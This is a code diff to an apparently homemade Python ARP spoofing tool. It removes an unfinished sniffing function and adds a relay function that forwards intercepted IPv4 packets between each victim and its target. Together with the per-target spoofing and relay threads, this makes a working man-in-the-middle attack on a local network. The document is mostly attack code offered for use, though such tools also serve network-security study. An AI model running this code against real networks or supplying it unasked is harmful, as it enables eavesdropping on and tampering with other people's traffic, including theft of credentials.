@@ -7,7 +7,6 @@ import re
 import struct
 from threading import *
 from time import sleep
-from pwn import hexdump
 from socket import *
 
 execmd = lambda cmd : subprocess.check_output(cmd, shell=True)
@@ -53,20 +52,7 @@ def make_arp(hwtype, ptype, hwlen, plen, oper, snd_mac, snd_ip, tar_mac, tar_ip)
     pkt += trans_ip(snd_ip)
     pkt += trans_mac(tar_mac)
     pkt += trans_ip(tar_ip)
-    return pkt
-
-'''
-Receive packet
-'''
-def sniff_pkt(idx):
-    s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
-    idx = 0
-    while True:
-        packet = s.recvfrom(65535)
-        eth_header = struct.unpack("!6s6s2s", packet[0][0:14])
-        if eth_header[2] == '\x08\x06':
-            arp_header = struct.unpack("2s2s1s1s2s6s4s6s4s", packet[0][14:42])
-             
+    return pkt   
 
 '''
 Get my mac,ip address 
@@ -87,11 +73,11 @@ def get_macaddr(ip_addr):
     arp_sndip = my_ip
     arp_tarmac = '00:00:00:00:00:00'
     arp_tarip = ip_addr
-    pay = make_arp(0x1, 0x0800, 0x6, 0x4, 'req', arp_sndmac, arp_sndip, arp_tarmac, arp_tarip)
-    sendeth(eth_srcmac, eth_dstmac, 0x0806, pay)
+    pay = make_arp(0x1, 0x0800, 0x6, 0x4, 'req', arp_sndmac, arp_sndip, arp_tarmac, arp_tarip)        
 
     s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
     while True:
+        sendeth(eth_srcmac, eth_dstmac, 0x0806, pay)
         packet = s.recvfrom(65535)
         eth_header = struct.unpack("!6s6s2s", packet[0][0:14])
         if eth_header[2] == '\x08\x06': #ETH_TYPE == ARP
@@ -115,6 +101,25 @@ def ARP_reply(idx):
         except:
             break
 
+'''
+ARP relay packet
+'''
+def ARP_relay(idx):
+    s = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
+    tmp_src_ip = ''
+    while True:
+        packet = s.recvfrom(65535)
+        eth_header = struct.unpack("!6s6s2s", packet[0][0:14])
+        if u16(eth_header[2]) == 0x800:
+            ip_header = struct.unpack("!12s4s4s", packet[0][14:34])
+            if reverse_mac(eth_header[0]) == my_mac:
+                if reverse_ip(ip_header[2]) == sender_ip[idx]:
+                    print '[2] {} -> {}'.format(reverse_ip(ip_header[1]), reverse_ip(ip_header[2]))
+                    sendeth(my_mac, sender_mac[idx], u16(packet[0][12:14]), packet[0][14:])
+                if reverse_ip(ip_header[1]) == sender_ip[idx]:
+                    print '[1] {} -> {}'.format(reverse_ip(ip_header[1]), reverse_ip(ip_header[2]))
+                    sendeth(my_mac, target_mac[idx], u16(packet[0][12:14]), packet[0][14:])
+          
 
 if __name__ == '__main__':
     print '[+] Check args.'
@@ -156,10 +161,8 @@ if __name__ == '__main__':
     for idx in range((len(sys.argv)-2)/2):
         print '[*] TARGET{} ARP_SPOOF THREAD START!'.format(idx+1)
         Thread(target=ARP_reply, args=(idx,)).start() 
-
-    for idx in range((len(sys.argv)-2)/2):
-        print '[*] TARGET{} SNIFFING THREAD START!'.format(idx+1)
-        Thread(target=sniff_pkt, args=(idx,)).start() 
+        print '[*] TARGET{} ARP_RELAY THREAD START!'.format(idx+1)
+        Thread(target=ARP_relay, args=(idx,)).start() 
 
     while(1):
         try:
